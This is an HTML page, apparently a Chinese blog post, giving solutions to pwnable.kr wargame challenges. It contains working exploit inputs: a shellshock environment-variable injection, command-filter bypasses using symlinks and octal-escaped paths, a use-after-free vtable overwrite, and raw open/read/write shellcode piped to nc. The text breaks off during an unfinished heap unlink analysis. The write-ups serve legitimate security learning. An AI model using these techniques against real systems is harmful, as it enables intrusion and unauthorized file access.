@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kerisa.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Toddler’s Bottleleg关键在于 pc 的计算。不像 x86 里 pc 总是指向下一条指令的地址，ARM 中的 pc 是下下条。假设当前指令地址为 x，即  ARM 模式：pc &#x3D; x + 8 Thumb 模式：pc &#x3D; x + 4  按这个规则计算得到 key1() + key2() + key3() &#x3D; 0x8ce4 + 0x8d0c + 0x8d8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr 练习（二）">
+<meta property="og:url" content="https://kerisa.github.io/1658/index.html">
+<meta property="og:site_name" content="Re: Memory (mirror)">
+<meta property="og:description" content="Toddler’s Bottleleg关键在于 pc 的计算。不像 x86 里 pc 总是指向下一条指令的地址，ARM 中的 pc 是下下条。假设当前指令地址为 x，即  ARM 模式：pc &#x3D; x + 8 Thumb 模式：pc &#x3D; x + 4  按这个规则计算得到 key1() + key2() + key3() &#x3D; 0x8ce4 + 0x8d0c + 0x8d8">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-08T13:28:30.000Z">
+<meta property="article:modified_time" content="2025-07-21T18:42:00.541Z">
+<meta property="article:author" content="flandre">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwnable.kr">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://flandre-scarlet.moe/blog/1658/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwnable.kr 练习（二） | Re: Memory (mirror)</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Re: Memory (mirror)</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kerisa.github.io/1658/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/sys-imgs/42553027_1.png">
+      <meta itemprop="name" content="flandre">
+      <meta itemprop="description" content="This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Re: Memory (mirror)">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.kr 练习（二）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-08 21:28:30" itemprop="dateCreated datePublished" datetime="2021-09-08T21:28:30+08:00">2021-09-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-22 02:42:00" itemprop="dateModified" datetime="2025-07-22T02:42:00+08:00">2025-07-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">程序</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="Toddler’s Bottle"></a>Toddler’s Bottle</h1><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p>关键在于 pc 的计算。不像 x86 里 pc 总是指向下一条指令的地址，ARM 中的 pc 是下下条。假设当前指令地址为 x，即</p>
+<ul>
+<li>ARM 模式：pc &#x3D; x + 8</li>
+<li>Thumb 模式：pc &#x3D; x + 4</li>
+</ul>
+<p>按这个规则计算得到 key1() + key2() + key3() &#x3D; 0x8ce4 + 0x8d0c + 0x8d80 &#x3D; 0x1A770，输入就好了 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">108400</span><br></pre></td></tr></table></figure></p>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>因为运算符优先级问题，fd 被赋值成 0，也就是 stdin，和 password 文件就没有关系了，可以输入 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111111111 0000000000</span><br></pre></td></tr></table></figure></p>
+<span id="more"></span>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>该题源自 bash 的任意指令执行的安全漏洞，摘自<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">维基百科</a></p>
+<blockquote>
+<p>Initial report (CVE-2014-6271) This original form of the vulnerability (CVE-2014-6271) involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.[33] The vulnerability can be tested with the following command: env x&#x3D;’() { :;}; echo vulnerable’ bash -c “echo this is a test” In systems affected by the vulnerability, the above commands will display the word “vulnerable” as a result of Bash executing the command “echo vulnerable”, which was embedded into the specially crafted environment variable named “x”.[8][34]</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> x=<span class="string">&#x27;() &#123; :;&#125;; /bin/cat flag&#x27;</span> ./shellshock</span><br></pre></td></tr></table></figure>
+
+<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>比较单纯的算法题？按题目要求的做就行了，用 pwntools 处理输入输出，最后再 ssh 上去跑一下 jio 本 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \* <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weigh</span>(<span class="params">conn, s, e</span>): coin\_<span class="built_in">list</span> = \[<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s, e+<span class="number">1</span>)\] <span class="comment"># \[s, e\] s = &quot; &quot;.join(coin\_list).encode() conn.sendline(s) output = conn.recvline().decode() result = re.search(&quot;(\\d+)&quot;, output).groups() assert(len(result) &gt; 0) return int(result\[0\])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">conn, N, C</span>): s = <span class="number">0</span> e = N-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(C): m = <span class="built_in">int</span>((s + e) / <span class="number">2</span>) <span class="comment"># print(&#x27;s:&#x27;, s, &quot;,e:&quot;, e, &quot;,m:&quot;, m) w = weigh(conn, s, m) # print(&quot;w:&quot;, w) if w == (m - s + 1) \* 10: # all real s = m + 1 else: e = m return (int)((s + e) / 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(): <span class="comment"># setup conn context.log\_level = &#x27;debug&#x27; conn = remote(&#x27;pwnable.kr&#x27;, 9007) conn.recvuntil(&#x27;Ready&#x27;) while True: output = conn.recvline\_regex(&#x27;N=(\\d+) C=(\\d+)&#x27;).decode() n, c = re.search(&#x27;N=(\\d+) C=(\\d+)&#x27;, output).groups() answer = guess(conn, int(n), int(c)) conn.sendline(str(answer).encode()) conn.recvuntil(&#x27;Correct!&#x27;) main()</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>给了一个源码的网页，网页已经失效了，但是可以在<a target="_blank" rel="noopener" href="https://web.archive.org/web/20201026050544/http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">网站时光机</a>上找到，然后在这坨代码里翻啊翻，你就会看到有问题的函数 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">betting</span><span class="params">()</span> </span>&#123; <span class="comment">//Asks user amount to bet printf(&quot;\\n\\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) &#123; //If player tries to bet more money than player has printf(&quot;\\nYou cannot bet more money than you have.&quot;); printf(&quot;\\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; &#125; else return bet; &#125; // End Function</span></span><br></pre></td></tr></table></figure> 可以看到第二次输入的 bet 没有作校验就返回了。所以在进入游戏后 bet 直接输入 1000000，判断失败后再输一次 1000000，赢了就好了。输入 -1000000，然后输掉也行……</p>
+<h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><p>虽然规则说得比较玄乎，但是代码的两个 for 循环还是暴露了……一开始还想着 urandom 里有没有什么 bug。只要你的输入能押对随机出的六个字节中的一个就能过关，并且值的范围已经缩小到了 1~45，所以直接试几次就好了…… <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>; <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123; <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123; <span class="keyword">if</span>(lotto\[i\] == submit\[j\])&#123; match++; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \* <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log\_level = <span class="string">&#x27;debug&#x27;</span> conn = process(<span class="string">&#x27;/home/lotto/lotto&#x27;</span>) conn.recvuntil(<span class="string">&#x27;3. Exit&#x27;</span>) <span class="keyword">while</span> <span class="literal">True</span>: conn.sendline(<span class="string">&#x27;1&#x27;</span>) conn.recvuntil(<span class="string">&#x27;Submit your 6 lotto bytes :&#x27;</span>) conn.send(<span class="string">&#x27; &#x27;</span>\*<span class="number">6</span>) <span class="comment"># 6 倍的快乐 conn.recvuntil(&#x27;bad luck...&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> int filter(char\* cmd)&#123; int r=0; r += strstr(cmd, <span class="string">&quot;flag&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;sh&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;tmp&quot;</span>)!=0; return r; &#125; int main(int argc, char\* argv\[\], char\*\* envp)&#123; putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>); <span class="keyword">if</span>(filter(argv\[1\])) return 0; system( argv\[1\] ); return 0; &#125;</span></span><br></pre></td></tr></table></figure> 随便跑到 /tmp 下 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/cmd1/flag f</span><br></pre></td></tr></table></figure> 创建一个符号链接，然后 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/cmd1 <span class="string">&quot;/bin/cat f&quot;</span></span><br></pre></td></tr></table></figure> 就好了……
+
+<h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> int filter(char\* cmd)&#123; int r=0; r += strstr(cmd, <span class="string">&quot;=&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;PATH&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;export&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;/&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;\`&quot;</span>)!=0; r += strstr(cmd, <span class="string">&quot;flag&quot;</span>)!=0; return r; &#125; extern char\*\* environ; void delete\_env()&#123; char\*\* p; for(p=environ; \*p; p++) memset(\*p, 0, strlen(\*p)); &#125; int main(int argc, char\* argv\[\], char\*\* envp)&#123; delete\_env(); putenv(<span class="string">&quot;PATH=/no\_command\_execution\_until\_you\_become\_a\_hacker&quot;</span>); <span class="keyword">if</span>(filter(argv\[1\])) return 0; printf(<span class="string">&quot;%s\\n&quot;</span>, argv\[1\]); system( argv\[1\] ); return 0; &#125;</span></span><br></pre></td></tr></table></figure> 比起 1 里更进一步，直接删除了进程中所有环境变量，这就导致必须用到路径分隔符。而代码里又限制了直接传入 '/'，所以就要考虑转义字符之类。可以将 '/' 编码后利用 printf 输出。同上，先到 /tmp 下面新建一个 flag 文件的符号链接 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/cmd2 <span class="string">&quot;\\<span class="subst">$(printf &#x27;\\057bin\\057cat \\057tmp\\057subdir\\057f&#x27;)</span>&quot;</span></span><br></pre></td></tr></table></figure> 其中 \\057 就是 '/' 的八进制编码，同时在 $ 前面加上反斜杠，这样 $ 就能在第一次执行时保留下来。
+
+<h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><p>看上去不是堆溢出的。那么就要先释放掉对象 m 和 w，然后再给 data 分配内存，让 data 的地址和 m 的地址一致，然后触发 m-&gt;introduce() 即可。 当然，也要构造 data 的内容，具体就从虚表下手了。 文件中分配给 m 的空间是 0x18 字节，测试了一下发现分配 data 时只要大小不超过 0x18，new 两次得到的地址就和 m 相同（当然 m 需要先 delete）。第一步完成。 调用 m-&gt;introduce() 时会先从 *m 处取到虚表的地址，查看类的定义，introduce 函数是表中的第二项，那么实际上就会先取得 *m（即 Man 类的虚表地址），然后取 *m + sizeof(void*) * 2 作为 introduce 函数的地址。所以我们把指向虚表的地址往前挪一下，就会变成 (*m - sizeof(void*)) + sizeof(void*) * 2，以为调用 introduce 就会调到 give_shell，因为 give_shell 函数是表中第一项。而 *m 固定为 0x401570，所以填入 0x401568 就行了。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\\x68\\x15\\x40\\x00&quot;</span> &gt; /tmp/in.txt ./uaf 24 /tmp/in.txt 3 // 触发 delete 2 2 // 两次 new 1 // 调用 <span class="string">&quot;introduce&quot;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><p>照着提示试一遍，发现程序会崩溃。检查一下可以发现是 sse 指令遇到非 16 字节对齐的内存地址时引起的。所以要求 malloc 出来给 dest 的地址 16 字节对齐。源码开头贴心的给出了编译选项，照着编一个二进制出来试一试就行。比如第 4 次分配 64 字节时是对齐的，第 5 次分配 128 字节时就不对齐了（发现多余了 8 字节），那么第 4 次就分配 64+8 字节，因为堆需要多分配 8 字节保留控制信息，后面以此类推 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8 16 32 72 136 264 520 1032 2056 4096</span><br></pre></td></tr></table></figure></p>
+<h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><p>只使用 open read write 函数，写 shellcode 读 flag 文件。 可用的内存空间固定为 0x41414000<del>0x41415000。 shellcode 的写入范围为 0x4141402e</del>0x41414416（代码中写死的 1000 字节读取长度） 文件名的字符串可以紧跟着 shellcode，不过需要根据最后写完的 shellcode 调整字符串偏移</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实际连到 nc 0 9026 时路径要改成 &quot;/home/asm\_pwn/...&quot; char\* ppath = // 太鸡儿长了，折一下 &quot;/home/asm/this\_is\_pwnable.kr\_flag\_file\_please\_read\_this\_file.sorry\_&quot; &quot;the\_file\_name\_is\_very\_looooooooooooooooooooooooooooooooooooooooooooooo&quot; &quot;ooooooooooooooooooooooooooooo0000000000000000000000000oooooooooooooooo&quot; &quot;ooooooo000000000000o0o0o0o0o0o0ong&quot;; \_\_asm\_\_ \_\_volatile\_\_ ( &quot;mov $2, %%rax\\n&quot; &quot;mov %0, %%rdi\\n&quot; &quot;mov $0, %%rsi\\n&quot; &quot;syscall\\n&quot; // open 的系统调用，ppath 就是文件路径，实际字符串紧跟在 shellcode 后面 &quot;mov %%rax, %%rdi\\n&quot; &quot;mov $0, %%rax\\n&quot; &quot;mov $0x41414400, %%rsi\\n&quot; &quot;mov $100, %%rdx\\n&quot; &quot;syscall\\n&quot; // read，读 100 字节到 0x41414400 这个缓冲区 &quot;mov $1, %%rax\\n&quot; &quot;mov $1, %%rdi\\n&quot; &quot;mov $0x41414400, %%rsi\\n&quot; &quot;mov $100, %%rdx\\n&quot; &quot;syscall\\n&quot; // write，输出到 stdout ::&quot;c&quot;(ppath));</span></span><br></pre></td></tr></table></figure> 比较操蛋的是在 asm 目录下通过（./asm < 1.txt）已经成功了但换到 nc 0 9026 改用 pwntools 脚本却没成功，搞来搞去最后用管道可以了…… 下面的字节码对应上面的汇编，
+
+<p>\x2F\x68\x6F</p>
+<p>开始就是路径字符串内容，调用 open 时需要设 rdi 为字符串地址，前面说到 shellcode 从 0x4141402e 开始，这样就能算出字符串实际位置在哪。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(&quot;\\x48\\x8D\\x05\\x57\\x00\\x00\\x00\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x48\\x89\\xC1\\x48\\xC7\\xC0\\x02\\x00\\x00\\x00\\x48\\x89\\xCF\\x48\\xC7\\xC6\\x00\\x00\\x00\\x00\\x0F\\x05\\x48\\x89\\xC7\\x48\\xC7\\xC0\\x00\\x00\\x00\\x00\\x48\\xC7\\xC6\\x00\\x44\\x41\\x41\\x48\\xC7\\xC2\\x64\\x00\\x00\\x00\\x0F\\x05\\x48\\xC7\\xC0\\x01\\x00\\x00\\x00\\x48\\xC7\\xC7\\x01\\x00\\x00\\x00\\x48\\xC7\\xC6\\x00\\x44\\x41\\x41\\x48\\xC7\\xC2\\x64\\x00\\x00\\x00\\x0F\\x05\\xCC\\x2F\\x68\\x6F\\x6D\\x65\\x2F\\x61\\x73\\x6D\\x5F\\x70\\x77\\x6E\\x2F\\x74\\x68\\x69\\x73\\x5F\\x69\\x73\\x5F\\x70\\x77\\x6E\\x61\\x62\\x6C\\x65\\x2E\\x6B\\x72\\x5F\\x66\\x6C\\x61\\x67\\x5F\\x66\\x69\\x6C\\x65\\x5F\\x70\\x6C\\x65\\x61\\x73\\x65\\x5F\\x72\\x65\\x61\\x64\\x5F\\x74\\x68\\x69\\x73\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x6F\\x72\\x72\\x79\\x5F\\x74\\x68\\x65\\x5F\\x66\\x69\\x6C\\x65\\x5F\\x6E\\x61\\x6D\\x65\\x5F\\x69\\x73\\x5F\\x76\\x65\\x72\\x79\\x5F\\x6C\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x6F\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x6F\\x30\\x6F\\x30\\x6F\\x30\\x6F\\x30\\x6F\\x30\\x6F\\x30\\x6F\\x6E\\x67\\x00\\x0a&quot;)&#x27;</span> &gt; /tmp/1.txt <span class="built_in">cat</span> /tmp/1.txt - nc 0 9026</span><br></pre></td></tr></table></figure></p>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>堆溢出。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> typedef struct tagOBJ&#123; struct tagOBJ\* fd; struct tagOBJ\* bk; char buf\[8\]; &#125;OBJ;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123; <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unlink</span><span class="params">(OBJ\* P)</span></span>&#123; OBJ\* BK; OBJ\* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span></span>&#123; <span class="built_in">malloc</span>(<span class="number">1024</span>); OBJ\* A = (OBJ\*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ)); OBJ\* B = (OBJ\*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ)); OBJ\* C = (OBJ\*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\\n&quot;</span>, &amp;A); <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\\n&quot;</span>, A); <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\\n&quot;</span>); <span class="comment">// heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0; &#125;</span></span><br></pre></td></tr></table></figure> 因为 unlink 时会操作链表的前向和后向节点，那么不管我把 BK 还是 FD 调整为 shell 函数的地址都会在 FD-&gt;bk&#x3D;BK 和 BK-&gt;fd&#x3D;FD 之一触发写入异常，因为代码段是不可写的。把它们写成堆缓冲区再建立跳板的 shellcode 也不行，因为有 dep。。。这里卡了好久。。。毕竟代码里能劫持的只有 unlink 的 ret 了。后来才想到 main 函数的 ret 也可以做手脚。 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; main 中调用 unlink 的地方 0x080485ef &lt;+192&gt;: pushl -0xc(%ebp) 0x080485f2 &lt;+195&gt;: call 0x8048504 &lt;unlink&gt; 0x080485f7 &lt;+200&gt;: add $0x10,%esp 0x080485fa &lt;+203&gt;: mov $0x0,%eax 0x080485ff &lt;+208&gt;: mov -0x4(%ebp),%ecx 0x08048602 &lt;+211&gt;: leave 0x08048603 &lt;+212&gt;: lea -0x4(%ecx),%esp 0x08048606 &lt;+215&gt;: ret</span><br></pre></td></tr></table></figure> 从 unlink 返回后绕圈子把 ebp 赋值给了 esp 然后 ret，而这个 ebp 在调用 unlink 时会保存到栈上，就有机会可以修改它了。三个 obj 对象 A B C 在堆上的布局是连续的</p>
